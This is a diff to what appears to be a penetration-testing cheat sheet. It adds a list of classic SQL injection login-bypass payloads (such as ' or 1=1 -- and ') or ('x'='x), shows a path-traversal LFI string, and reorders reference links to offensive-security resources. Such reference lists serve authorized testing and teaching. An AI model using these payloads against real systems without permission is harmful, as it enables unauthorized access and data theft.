@@ -269,14 +269,28 @@ Contents
          Windows
              'LFI -php?list=../../../../../../../../../../<>>>>'
       SQL Injection     #Examine how the server behaves
+            ' or '1'='1
+            ' or 1=1-- -
+            ' or 1=1 --	    
+            a' or 1=1 --	
+	         " or 1=1 --	  
+	         a" or 1=1 --	      
+           ' or 1=1 #	      
+           " or 1=1 #	     
+           or 1=1 --	      
+           ' or 'x'='x	  
+           " or "x"="x	  
+           ') or ('x'='x	
+           ") or ("x"="x	      
+           ' or username LIKE '%admin% 
+
+         https://www.exploit-db.com/papers/12975
          https://dev.mysql.com/doc/refman/8.0/en/select.html
          https://gracefulsecurity.com/sql-injection-exploitation/
-         https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
          https://www.exploit-db.com/papers/12975
          https://www.tarlogic.com/en/blog/red-team-tales-0x01/
          https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
-            ' or '1'='1
-            ' or 1=1-- -
+
          http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
          https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell
          https://portswigger.net/web-security/sql-injection/union-attacks
